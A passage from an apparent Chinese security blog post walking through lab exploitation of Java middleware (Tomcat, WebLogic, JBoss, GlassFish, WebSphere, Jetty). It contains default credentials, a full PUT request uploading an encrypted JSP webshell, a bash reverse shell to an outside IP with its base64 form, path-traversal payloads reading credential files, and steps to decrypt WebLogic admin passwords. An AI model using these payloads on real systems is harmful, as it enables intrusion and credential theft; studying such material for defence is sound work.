Tomcat本地提权漏洞(CVE-2016-1240)
Tomcat之JMX服务弱口令漏洞
Tomcat的PUT的上传漏洞(CVE-2017-12615)
Tomcat win版默认空口令漏洞(CVE-2009-3548)
Tomcat 样例目录session操控漏洞
</code></pre> 
<h5><a id="2shell_459"></a>2.弱口令+后台拿shell</h5> 
<ul><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/76/83/2Xz9PlJ4_o.png" alt="在这里插入图片描述"></p> </li><li> <p>使用弱口令登录后台</p> <pre><code>:8080/manager/html

tomcat:tomcat
</code></pre> <p><img src="https://images2.imgbox.com/c2/34/hpMX43Lg_o.png" alt="在这里插入图片描述"></p> </li><li> <p>将jsp马压缩为.war，完成后上传</p> <pre><code>jar -cvf shell.war shell.jsp
</code></pre> <p><img src="https://images2.imgbox.com/92/9b/hSBtxAAJ_o.png" alt="在这里插入图片描述"></p> </li><li> <p>完成上传，连接shell</p> <p><img src="https://images2.imgbox.com/42/83/jUWoICz0_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h5><a id="3PUTCVE201712615_491"></a>3、PUT上传漏洞（CVE-2017-12615）</h5> 
<ul><li> <p>在Tomcat配置文件设置了PUT上传方法，在 <strong>web.xml</strong> 文件，可以发现，默认 readonly 为 true，当 readonly设置为 <strong>false</strong> 时，可以通过 <strong>PUT / DELETE</strong> 进行文件操控</p> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/88/da/P5E1NqCW_o.png" alt="在这里插入图片描述"></p> </li><li> <p>发送数据包，虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/ ）来绕过了限制</p> <pre><code>PUT /glc.jsp/ HTTP/1.1
Host: 47.99.49.128:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 612

&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;
</code></pre> <p><img src="https://images2.imgbox.com/ad/45/RhqLC5MF_o.png" alt="在这里插入图片描述"></p> </li><li> <p>连接shell</p> </li></ul> 
<p><img src="https://images2.imgbox.com/f9/85/4oH0aEAb_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="weblogic_528"></a>五、weblogic</h4> 
<ul><li>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个<strong>基于JAVA EE架构的中间件</strong></li><li>WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</li></ul> 
<h5><a id="1weblogic_533"></a>1.weblogic常见漏洞</h5> 
<pre><code>#控制台路径泄露
Weakpassword 弱口令
weblogic SSRF （CVE20144210）漏洞
weblogic 反序列化（CVE20154852）
weblogic 反序列化（CVE20160638）
weblogic 反序列化（CVE20163510）
weblogic 反序列化（CVE20173248）
weblogic 反序列化（CVE20182628）
weblogic 反序列化（CVE20182893）
weblogic 文件上传（CVE20182894）
weblogic XMLDecoder反序列化（CVE201710271）
weblogic XMLDecoder反序列化（CVE20173506）
weblogic 未授权访问CVE202014883（CVE202014882）
</code></pre> 
<h5><a id="2weblogic_551"></a>2.weblogic文件读取漏洞</h5> 
<ul><li> <p>文件路径：weblogic/weak_password</p> </li><li> <p>版本信息</p> <pre><code>Weblogic版本：10.3.6(11g)
Java版本：1.6
</code></pre> </li><li> <p>环境启动后，访问<code>http://your-ip:7001/console</code>，即为weblogic后台</p> <p><img src="https://images2.imgbox.com/2d/e9/RtAp186V_o.png" alt="在这里插入图片描述"></p> </li><li> <p>弱口令：本环境存在弱口令</p> <pre><code>账号：weblogic
密码：Oracle@123
</code></pre> <p><img src="https://images2.imgbox.com/90/56/NDE1KCtt_o.png" alt="在这里插入图片描述"></p> </li><li> <p>任意文件读取漏洞的利用</p> 
  <ul><li> <p>本环境前台模拟了一个任意文件下载漏洞，访问<code>/hello/file.jsp?path=/etc/passwd</code>可见成功读取passwd文件</p> <p><img src="https://images2.imgbox.com/6e/f1/dJb4W8sB_o.png" alt="在这里插入图片描述"></p> </li><li> <p>读取后台用户密文与密钥文件</p> 
    <ul><li> <p>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为<code>SerializedSystemIni.dat</code>和<code>config.xml</code>，在本环境中为<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code>（基于当前目录<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>）</p> </li><li> <p><code>SerializedSystemIni.dat</code>是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件</p> <pre><code>/hello/file.jsp?path=security/SerializedSystemIni.dat
</code></pre> <p><img src="https://images2.imgbox.com/d9/1e/xrZ5sLiw_o.png" alt="在这里插入图片描述"></p> </li><li> <p><code>config.xml</code>是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值，即为加密后的管理员密码，不要找错了</p> <pre><code>/hello/file.jsp?path=config/config.xml
</code></pre> <p><img src="https://images2.imgbox.com/ac/2b/80hcnysa_o.png" alt="在这里插入图片描述"></p> </li></ul> </li><li> <p>解密密文</p> 
    <ul><li>然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文</li></ul> <p><img src="https://images2.imgbox.com/d3/77/ESurqHbT_o.png" alt="在这里插入图片描述"></p> 
    <ul><li>可见，解密后和我预设的密码一致，说明成功</li></ul> </li></ul> </li></ul> 
<h5><a id="3_CVE20182893_616"></a>3.远程代码执行 （CVE-2018-2893）</h5> 
<ul><li> <p>影响范围</p> <pre><code>Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.2
Oracle WebLogic Server 12.2.1.3
</code></pre> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/02/9b/7Tr6uBqX_o.png" alt="在这里插入图片描述"></p> </li><li> <p>工具梭哈</p> <p><img src="https://images2.imgbox.com/1b/e0/nTUs5vfb_o.png" alt="在这里插入图片描述"></p> </li><li> <p>反弹shell</p> <p><img src="https://images2.imgbox.com/71/ff/fJEe0U1g_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h5><a id="4_CVE202014883_642"></a>4.远程代码执行 （CVE-2020-14883）</h5> 
<ul><li> <p>影响版本</p> <pre><code>weblogic 10.3.6.0.0
weblogic 12.1.3.0.0
weblogic 12.2.1.3.0
weblogic 12.2.1.4.0
weblogic 14.1.1.0.0
</code></pre> </li><li> <p>启动靶场</p> <p><img src="https://images2.imgbox.com/ee/f9/jWlUv4cM_o.png" alt="在这里插入图片描述"></p> </li><li> <p>直接梭哈</p> <p><img src="https://images2.imgbox.com/cf/e6/f6aeg5Jm_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h4><a id="Jboss_664"></a>六、Jboss</h4> 
<ul><li>通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器</li><li>fofa语法：“JBoss” &amp;&amp; title==“Welcome to JBoss™”</li></ul> 
<h5><a id="1CVE201712149_669"></a>1.CVE-2017-12149</h5> 
<ul><li> <h6><a id="5x6x_671"></a>影响的版本：5.x和6.x</h6> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/82/d4/n1kocWxG_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/f3/40/Qa9FKPsG_o.png" alt="在这里插入图片描述"></p> </li><li> <p>由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码</p> <pre><code>bash -i &gt;&amp; /dev/tcp/120.46.39.241/8848 0&gt;&amp;1

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNDYuMzkuMjQxLzg4NDggMD4mMQ==
</code></pre> </li><li> <p>工具梭哈</p> <pre><code>https://github.com/yunxu1/jboss-_CVE-2017-12149
</code></pre> <p><img src="https://images2.imgbox.com/b7/3e/mNw94rSa_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h4><a id="GlassFish_698"></a>七、GlassFish</h4> 
<ul><li>GlassFish 是一款强健的商业兼容应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改</li><li>fofa搜索语法：“glassfish” &amp;&amp; port=“4848”</li><li>默认端口：4848</li></ul> 
<h5><a id="1CVE20171000028_704"></a>1.任意文件读取（CVE-2017-1000028）</h5> 
<ul><li> <p>影响版本：Oracle GlassFish Server Open Source Edition 4.1版本</p> </li><li> <p>打开靶场</p> <p><img src="https://images2.imgbox.com/0a/84/ycUhwluP_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/f0/ae/WeOJixqa_o.png" alt="在这里插入图片描述"></p> </li><li> <p>POC</p> 
  <ul><li> <p>读密码</p> <pre><code>/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile
</code></pre> <p><img src="https://images2.imgbox.com/e3/2f/DvMun0YF_o.png" alt="在这里插入图片描述"></p> </li><li> <p>读windows文件</p> <pre><code>/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
</code></pre> </li><li> <p>读linux文件</p> <pre><code>/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
</code></pre> <p><img src="https://images2.imgbox.com/05/b7/nopWye51_o.png" alt="在这里插入图片描述"></p> </li></ul> </li></ul> 
<h4><a id="WebSphere_743"></a>八、WebSphere</h4> 
<ul><li> <p>WebSphere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。WebSphere 提供了可靠、灵活和健壮的软件</p> </li><li> <p>端口：9080—web(http)应用访问端口、9443—web(https)应用访问端口、9060—管理后台访问端口、9043—管理控制台安全端口、8880—SOAP连接器端口等等</p> </li><li> <p>漏洞探测在8880端口，后台是9060端口，解析是9080端口</p> </li><li> <p>fofa语法：</p> <p>“websphere” &amp;&amp; server==“WebSphere Application Server/7.0” &amp;&amp; port=“8880”</p> <p>“websphere” &amp;&amp; server==“WebSphere Application Server/7.0” &amp;&amp; port=“9060”</p> </li></ul> 
<h5><a id="1CVE20157450_757"></a>1.反序列化（CVE-2015-7450）</h5> 
<ul><li> <p>漏洞影响版本</p> <p>IBM Websphere Application Server 7.0<br> IBM Websphere Application Server 6.2</p> </li><li> <p>启动环境</p> <pre><code>拉取镜像：docker pull iscrosales/websphere7
启动镜像：docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7
</code></pre> <p><img src="https://images2.imgbox.com/7f/d3/dYwxKNmB_o.png" alt="在这里插入图片描述"></p> </li><li> <p>漏洞页面</p> <p><img src="https://images2.imgbox.com/23/81/PRhihxDB_o.png" alt="在这里插入图片描述"></p> </li><li> <p>工具梭哈</p> <p><img src="https://images2.imgbox.com/3c/91/wGqbT3rg_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h5><a id="2shell_784"></a>2.弱口令上传功能拿shell</h5> 
<ul><li> <p>发现漏洞</p> <p><img src="https://images2.imgbox.com/38/88/9v9tNjtn_o.png" alt="在这里插入图片描述"></p> </li><li> <p>访问控制页面，输入admin登录</p> <pre><code>:9060/ibm/console/
</code></pre> <p><img src="https://images2.imgbox.com/98/f3/Gx1jA6dE_o.png" alt="在这里插入图片描述"></p> </li><li> <p>生成mua，压缩为zip文件，然后修改后缀为.war，点击上传</p> <p><img src="https://images2.imgbox.com/74/e9/zJ2rxFps_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/97/84/rPTm65jR_o.png" alt="在这里插入图片描述"></p> <p><img src="https://images2.imgbox.com/c9/7c/Rzeg3mFL_o.png" alt="在这里插入图片描述"></p> </li><li> <p>一直点next，然后设置路径</p> <p><img src="https://images2.imgbox.com/4e/59/9wIBltK0_o.png" alt="在这里插入图片描述"></p> </li><li> <p>点击完成，然后选择save</p> <p><img src="https://images2.imgbox.com/1d/a8/sp8FhGs4_o.png" alt="在这里插入图片描述"></p> </li><li> <p>启用我们上传的文件</p> <p><img src="https://images2.imgbox.com/fa/34/V6tCQfa3_o.png" alt="在这里插入图片描述"></p> </li><li> <p>访问文件需要到特定的访问端口：9080—web(http)应用访问端口、9443—web(https)应用访问端口</p> <p><img src="https://images2.imgbox.com/e5/bf/71aiBoCP_o.png" alt="在这里插入图片描述"></p> </li></ul> 
<h4><a id="Jetty_831"></a>九、Jetty</h4> 
<ul><li>Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</li></ul> 
<h5><a id="1_835"></a>1.敏感信息泄露</h5> 
<ul><li> <p>CVE-2021-28164</p> <p>信息泄露路径：http://目标ip:端口/%2e/WEB-INF/web.xml</p> </li><li> <p>CVE-2021-28169</p> <p>信息泄露路径：http://目标ip:端口/static?/WEB-INF/web.xml</p> </li><li> <p>CVE-2021-34429</p> <p>信息泄露路径：http://目标ip:端口/%u002e/WEB-INF/web.xml</p> <p><img src="https://images2.imgbox.com/1d/d1/mrHlhCrX_o.png" alt="在这里插入图片描述"></p> </li></ul>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2f7b69078ab1c9f1ba223ab0be26790b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">RabbitMQ之死信交换机</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0e5c28c6d716121fe63252574be24ee5/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">centos安装aws，aws: 未找到命令...</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>